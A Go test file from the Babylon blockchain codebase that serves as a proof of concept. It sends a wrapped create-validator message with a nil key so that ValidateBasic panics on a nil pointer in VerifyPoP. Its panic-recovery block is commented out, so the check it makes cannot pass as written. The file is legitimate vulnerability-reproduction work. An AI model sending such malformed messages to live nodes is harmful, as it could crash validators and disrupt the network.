package types_test

import (
	"testing"

	"github.com/babylonlabs-io/babylon/x/checkpointing/types"

	"github.com/cometbft/cometbft/crypto/ed25519"
	cryptocodec "github.com/cosmos/cosmos-sdk/crypto/codec"
	sdk "github.com/cosmos/cosmos-sdk/types"
	stakingtypes "github.com/cosmos/cosmos-sdk/x/staking/types"

	math "cosmossdk.io/math"
	"github.com/stretchr/testify/require"
)

// Helper: minimally-valid inner MsgCreateValidator so ValidateBasic
// continues past the early checks and reaches VerifyPoP.

func makeInnerMsg(t *testing.T) *stakingtypes.MsgCreateValidator {
	priv := ed25519.GenPrivKey()
	valAddr := sdk.ValAddress(priv.PubKey().Address())
	consPub, _ := cryptocodec.FromCmtPubKeyInterface(priv.PubKey())

	msg, err := stakingtypes.NewMsgCreateValidator(
		valAddr.String(),
		consPub,
		sdk.NewCoin("ubbn", math.NewInt(1)), // 1 ubbn
		stakingtypes.NewDescription("t", "", "", "", ""),
		stakingtypes.NewCommissionRates(
			math.LegacyZeroDec(), math.LegacyZeroDec(), math.LegacyZeroDec(),
		),
		math.NewInt(1), // minSelfDelegation = 1
	)
	require.NoError(t, err)
	return msg
}

// PoC: ValidateBasic panics when Key == nil

func TestValidateBasic_PanicsOnNilKey(t *testing.T) {
	poison := &types.MsgWrappedCreateValidator{
		MsgCreateValidator: makeInnerMsg(t),
		Key:                nil, // triggers nil-pointer panic in VerifyPoP
	}

	didPanic := false
	// defer func() {
	// 	if r := recover(); r != nil {
	// 		didPanic = true
	// 		stack := debug.Stack()

	// 		t.Logf("caught panic: %v", r)
	// 		t.Logf("full stacktrace:\n%s", stack)

	// 		require.Contains(t, fmt.Sprint(r), "nil pointer",
	// 			"panic should be nil-pointer dereference")
	// 		require.Contains(t, string(stack), "VerifyPoP",
	// 			"stacktrace should show VerifyPoP frame")
	// 	}
	// }()

	_ = poison.ValidateBasic() // should hit VerifyPoP and panic
	require.True(t, didPanic, "ValidateBasic did NOT panic")
}
